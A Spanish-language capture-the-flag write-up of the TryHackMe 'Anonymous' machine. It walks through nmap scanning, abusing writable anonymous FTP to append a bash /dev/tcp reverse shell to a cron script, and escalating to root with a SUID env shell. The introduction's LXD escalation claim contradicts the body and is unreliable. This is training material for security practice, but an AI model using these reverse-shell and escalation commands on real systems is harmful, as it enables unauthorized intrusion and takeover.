# ✍️ Writeup CTF: Anonymous (TryHackMe) 🎯

## 📝 Introducción al CTF

La máquina **Anonymous** de TryHackMe es un desafío centrado en la **enumeración y explotación de un servidor FTP mal configurado**.

El vector de ataque principal se basa en que el servidor FTP tiene configurado un acceso de **invitado con permisos de escritura (Anonymous Login)**. Esta vulnerabilidad es crítica, ya que nos permitirá modificar un *script* (`clean.sh`) que se ejecuta periódicamente mediante una **tarea cron** dentro de la máquina. La explotación de este *script* nos otorgará la primera *shell* (Usuario).

Para la escalada de privilegios (Root), aprovecharemos que el usuario obtenido pertenece al grupo `sudo`. Específicamente, utilizaremos la vulnerabilidad de **LXD** (Linux Container Hypervisor), que al ser considerado administrador por pertenecer al grupo `sudo`, nos permitirá obtener acceso *root* total en el sistema.

---

## 1. Reconocimiento (Fase de Exploración Inicial) 🔎

El primer paso en cualquier CTF es asegurarse de que la máquina objetivo está activa y que podemos comunicarnos con ella.

### Identificación de la IP y Ping 📡

<img width="562" height="191" alt="Ping" src="https://github.com/user-attachments/assets/7afb769b-556a-4709-9d14-28735622b580" />


Antes de comenzar, es necesario establecer una conexión a la red de TryHackMe y determinar la dirección IP de la máquina **Anonymous**. En este caso, la IP es **10.10.10.180**.

Para verificar la conectividad, se utiliza el comando `ping` con el parámetro `-c 4` para enviar exactamente 4 paquetes ICMP.

**Comando:**
```bash
ping -c 4 10.10.10.180
````

El resultado confirma que la máquina objetivo está activa y accesible (✅), con un 0% de pérdida de paquetes.

## 2. Escaneo de Puertos (Nmap) 🚪

Una vez confirmada la conectividad, el siguiente paso es identificar qué servicios están corriendo en el objetivo. Para esto, utilizamos la herramienta **Nmap** con opciones agresivas (`-A`) para detección de versiones, servicios, y *scripts* por defecto.

<img width="1013" height="768" alt="Nmap" src="https://github.com/user-attachments/assets/9f66f016-1b79-4de4-9a8f-58091e007051" />

**Comando:**
```bash
nmap -sC -sV -A 10.10.10.180
````

Conclusión del Escaneo

El puerto 21 (FTP) es el punto más interesante. La respuesta del servidor VSFTPD 3.0.3 indica claramente:

Anonymous Login allowed (ftp code 230).

El script de Nmap (ftp-syst) revela que el directorio /scripts tiene permisos de escritura ([NSE: writeable]).

## 3. Explotación Inicial (FTP Anónimo) 🔑

El escaneo de Nmap reveló que el puerto **21 (FTP)** permite el acceso anónimo y que el directorio `/scripts` tiene permisos de escritura. Este será nuestro punto de entrada.

### Conexión y Enumeración del Directorio `scripts`

Nos conectamos al servidor FTP utilizando el nombre de usuario `anonymous` y cualquier contraseña (por convención, se usa la dirección de correo o simplemente se deja vacío).

**Comando:**
```bash
ftp 10.10.10.180
# Usuario: anonymous
# Contraseña: <Enter> (o cualquier cosa)
````

Una vez dentro, navegamos al directorio scripts y listamos su contenido:

Comandos FTP:
````
ftp> cd scripts
ftp> ls
````
Resultado (Captura de Pantalla):

Los archivos encontrados son:

clean.sh: Un script de shell con permisos de ejecución (-rwxrwxrwx).

removed_files.log: Un archivo de registro.

to_do.txt: Un archivo de texto.

Descarga de Archivos para Análisis

Procedemos a descargar los tres archivos para examinarlos en nuestro sistema local. Utilizaremos el comando mget * para descargar todos los archivos, confirmando la transferencia de cada uno.

<img width="1371" height="350" alt="me descargo todos los archivos" src="https://github.com/user-attachments/assets/04d7cdd6-92c6-46f0-8321-dd64a3f685c3" />

Comando FTP:
````
Fragmento de código

ftp> mget *
````

## 4. Análisis de Archivos Descargados 🕵️

Una vez descargados los tres archivos del directorio `/scripts` del FTP, procedemos a analizarlos para confirmar el vector de ataque y buscar pistas.

### 4.1. `to_do.txt`

Este archivo contiene una nota del administrador, confirmando la inseguridad crítica que estamos explotando.

<img width="602" height="72" alt="leo to do txt" src="https://github.com/user-attachments/assets/1789e7e5-586f-419e-b455-ae4a40c1c4e8" />

**Comando:**
```bash
cat to_do.txt
````

Resultado (Captura de Pantalla):

Conclusión: La nota "I really need to disable the anonymous login...it's really not safe" (Realmente necesito deshabilitar el inicio de sesión anónimo... no es seguro) confirma que el acceso anónimo es la vulnerabilidad intencional.

4.2. removed_files.log

<img width="573" height="545" alt="leo removed files1" src="https://github.com/user-attachments/assets/3a8922c2-c2c9-44d2-bf31-7e69a2ef02d7" />

Este log muestra la actividad recurrente del script de limpieza, lo que indica que se está ejecutando mediante una tarea cron.

Comando:
````
Bash

cat removed_files.log
````
Resultado (Captura de Pantalla):

Conclusión: La repetición de la frase "Running cleanup script: nothing to delete" confirma que el script se ejecuta periódicamente (probablemente cada 5 minutos, como es común en este tipo de CTFs) y que nuestro payload será ejecutado.

4.3. clean.sh

Este es el archivo crítico. Su contenido revela qué está haciendo el servidor y, lo más importante, dónde inyectar nuestro reverse shell.

<img width="968" height="221" alt="leo clean sh" src="https://github.com/user-attachments/assets/3ab98870-b7c8-4fb6-b62a-5f62fcc9c7ff" />

Comando:
````
Bash

cat clean.sh
````
Resultado (Captura de Pantalla):

Análisis del Script: El script verifica la existencia de archivos temporales. La parte crucial es que toda la lógica del script reside en este archivo y, dado que tenemos permisos de escritura en el directorio, podemos sobrescribir el contenido de clean.sh con nuestro código malicioso.

¡Vector de ataque finalizado! Modificaremos el archivo clean.sh con un payload de reverse shell y esperaremos a que la tarea cron lo ejecute para obtener acceso.

## 5. Enumeración de Servicios Adicionales (SMB) 💾

Aunque el vector de ataque principal se identificó en el servicio FTP, es una buena práctica enumerar todos los servicios abiertos para no perder posibles pistas. Procedemos a revisar el servicio **SMB/Samba** (puertos 139 y 445).

### 5.1. Listado de Recursos Compartidos (Shares)

Utilizamos la herramienta `smbclient` para listar los recursos compartidos disponibles en el servidor de forma anónima (`-N`).

<img width="951" height="317" alt="entro por smb a pics y descargo los arhcivos" src="https://github.com/user-attachments/assets/3941d20d-6a42-476c-aee8-f2629ad4816e" />

**Comando:**
```bash
smbclient -N //10.10.10.180
````

Resultado (Captura de Pantalla):

Los recursos compartidos interesantes son:

print$: Drivers de impresora (Común).

pics: Directorio de imágenes. (Punto de interés)

IPC$: Servicio de comunicación entre procesos (Común).

5.2. Acceso y Descarga del Recurso pics

Accedemos al recurso compartido pics de forma anónima para ver su contenido.

Comando:
````
Bash

smbclient -N //10.10.10.180/pics
````

Una vez conectados, listamos y descargamos los archivos encontrados.

Comandos SMB:

Fragmento de código
````
smb: \> ls
smb: \> mget *
````

Resultado (Captura de Pantalla):

Se descargaron dos archivos: cargo2.jpg y puppos.jpeg.

5.3. Análisis de las Imágenes

Las imágenes se examinaron en busca de metadatos ocultos, steganography o información relevante (por ejemplo, con exiftool o binwalk).

Conclusión:  las imágenes no contenían información útil para el avance del CTF. Esto confirma que el vector principal de ataque sigue siendo la explotación del FTP Anónimo mediante la tarea cron.

## 6. Inyección y Obtención de Reverse Shell 💣

Con el análisis confirmado de que el script `clean.sh` se ejecuta periódicamente (Cron Job) y que el directorio es escribible, el siguiente paso es inyectar un *reverse shell* y obtener acceso.

### 6.1. Confirmación de la Tarea Cron

Antes de la inyección, se vuelve a descargar y revisar el archivo `removed_files.log`. El hecho de que el número de registros haya aumentado desde la última descarga confirma que la tarea cron se está ejecutando activamente.

**Resultado (Captura de Pantalla):**

<img width="681" height="689" alt="descargo por segunda vez el log y aumentan los registros" src="https://github.com/user-attachments/assets/b6c4ac34-7cca-4bb0-814b-bc4827ce1f67" />

### 6.2. Inyección del Payload

Editamos el archivo `clean.sh` descargado localmente e inyectamos un *payload* de *reverse shell* de `bash` que apunte a nuestra dirección IP de la VPN de TryHackMe y un puerto de escucha (ejemplo: 9001).

<img width="1049" height="271" alt="modifico el script con un shell inverso" src="https://github.com/user-attachments/assets/f050167d-d3e9-4331-adde-7d0b2ab088fd" />

**Payload Inyectado:**
```bash
bash -i >& /dev/tcp/TU_IP_VPN/9001 0>&1
````

6.2. Uso del Comando append

Utilizamos el comando append para transferir el contenido del archivo local y añadirlo al final del archivo remoto clean.sh.

Comando FTP:
````
Fragmento de código

ftp> append clean.sh (remote-file) clean.sh
````
Resultado (Captura de Pantalla - Ayuda de FTP):

<img width="1648" height="183" alt="comando append en ftp" src="https://github.com/user-attachments/assets/69c3b2cf-1cad-49a3-a3b1-3b7530633edf" />


Resultado (Captura de Pantalla - Transferencia):

<img width="1015" height="177" alt="transfiero mi script" src="https://github.com/user-attachments/assets/6abfa582-8a3e-4757-a113-79feb79710ea" />

## 7. Obtención de Shell y Flag de Usuario 👤

El último paso para el acceso inicial es la activación de la tarea cron y la captura de la *reverse shell*.

### 7.1. Activación y Captura de la Shell

Tras subir el *payload* con el comando `append` (Paso 6), configuramos nuestro *listener* con `netcat` en el puerto `9001` y esperamos a que el script `clean.sh` sea ejecutado por la tarea cron.

**Comando Listener:**
```bash
nc -nvlp 9001
```
Resultado (Captura de Pantalla - Conexión):

<img width="1507" height="357" alt="espero la llamada y obtengo el shell" src="https://github.com/user-attachments/assets/7ad52cc1-369f-428d-a59c-61ef991ee583" />

¡Conexión recibida! Hemos obtenido una shell de bajo privilegio como el usuario namelessone.

7.2. Recuperación de la Flag de Usuario

Una vez dentro, el primer objetivo es encontrar la bandera de usuario (user.txt), que generalmente se encuentra en el directorio personal del usuario obtenido.

Comandos:

````
Bash

ls
cat user.txt
````

Resultado (Captura de Pantalla - Flag):

<img width="826" height="294" alt="obtengo flag user" src="https://github.com/user-attachments/assets/d49e32c3-1577-4f58-9a87-8fc58299dc7e" />

Hemos obtenido exitosamente la primera bandera.

Flag de Usuario (user.txt): 90c************************************** (Valor oculto por seguridad)

## 8. Enumeración para Escalada de Privilegios 🪜

Una vez con la *shell* del usuario `namelessone`, comenzamos la fase de escalada de privilegios para obtener el acceso como `root`.

### 8.1. Verificación de Permisos Sudo

El primer paso es verificar si el usuario `namelessone` tiene permisos para ejecutar comandos como `root` a través de `sudo`.

**Comando:**
```bash
sudo -l
````

<img width="717" height="684" alt="miro permisos sin sudo" src="https://github.com/user-attachments/assets/eda77031-aa96-4e8e-ab3f-90038a354539" />

Tras varios intentos fallidos de ingresar la contraseña, se confirma que no tenemos la contraseña del usuario namelessone, por lo que la escalada directa con sudo queda descartada por el momento.

8.2. Búsqueda de Binarios SUID

El siguiente paso estándar es buscar binarios con el bit SUID activado, que permiten a un usuario ejecutar un archivo con los permisos del propietario (a menudo root).

Comando:
````
Bash

find / -perm -u=s -type f 2>/dev/null
````

Se encuentran varios binarios SUID relacionados con snap/core (/bin/ping, /bin/su, /bin/umount, etc.), que son comunes en sistemas Ubuntu y generalmente no son vulnerables

## 9. Búsqueda del Vector de Escalada (GTFOBins) 🔎

La enumeración inicial (Paso 8) reveló que el ataque directo por `sudo` o SUIDs obvios no era factible, ya que la mayoría de los binarios SUID encontrados eran comunes del sistema. Sin embargo, la lista de binarios SUID contenía una pista crucial.

### 9.1. Identificación del Binario Explotable

Revisando el resultado del comando `find / -perm -u=s -type f 2>/dev/null`, se identificó el binario `/usr/bin/env` como un potencial vector de ataque:

**Binario Identificado (Fragmento de la búsqueda SUID):**

/usr/bin/env

**Resultado (Captura de Pantalla - Encontrado):**

<img width="1020" height="333" alt="usaremos este env para escalar" src="https://github.com/user-attachments/assets/d9b30037-2f72-4c73-8d53-a90f88dd1308" />

### 9.2. Consulta en GTFOBins

Consultamos la base de datos **GTFOBins** para ver si `/usr/bin/env` tiene un método conocido para la escalada de privilegios a través de la funcionalidad SUID.

**Página de GTFOBins:**
`https://gtfobins.github.io/gtfobins/env/#suid`

**Resultado (Captura de Pantalla - GTFOBins):**

<img width="1449" height="644" alt="miramos gtfobis" src="https://github.com/user-attachments/assets/5970ace3-bb9d-4c80-9149-d6e527efe99d" />

**Método de Explotación SUID de `env`:**
El sitio confirma que el binario `env` es vulnerable cuando tiene el *bit* SUID. El método de explotación permite ejecutar un *shell* (`/bin/sh`) manteniendo los privilegios elevados del propietario (en este caso, `root`), ya que el `env` con SUID no elimina los privilegios.

**Comando de Explotación:**
```bash
/usr/bin/env /bin/sh -p
````

## 10. Escalada de Privilegios a Root y Flag Final 👑

Habiendo identificado el binario SUID `/usr/bin/env` como el vector de escalada (Paso 9), procedemos a ejecutar la explotación para obtener acceso como el usuario `root`.

### 10.1. Explotación de SUID en `env`

Utilizamos la sintaxis proporcionada por **GTFOBins** que explota el hecho de que `env` mantiene los privilegios del propietario (`root`) al ejecutar un *shell* con el parámetro `-p`.

**Comando de Escalada:**
```bash
/usr/bin/env /bin/sh -p
````
Resultado (Captura de Pantalla - Root Shell):

<img width="816" height="537" alt="ejecuto el binario y soy root" src="https://github.com/user-attachments/assets/40bf003e-5506-4c78-92ec-49722131f712" />

Tras la ejecución, verificamos nuestra identidad con whoami. La salida es root. ¡Hemos obtenido control total de la máquina!

10.2. Obtención de la Flag de Root
El paso final es localizar la bandera de root (root.txt), la cual se encuentra típicamente en el directorio /root.

Comandos:
````
Bash

cd /root
ls
cat root.txt
````
Resultado (Captura de Pantalla - Flag Final):

<img width="375" height="135" alt="entro a root y obtengo flag" src="https://github.com/user-attachments/assets/73f5f30c-a020-408f-a103-54d5ec0d517c" />

Hemos obtenido la bandera final.

Flag de Root (root.txt): 4d9************************************** (Valor oculto por seguridad)
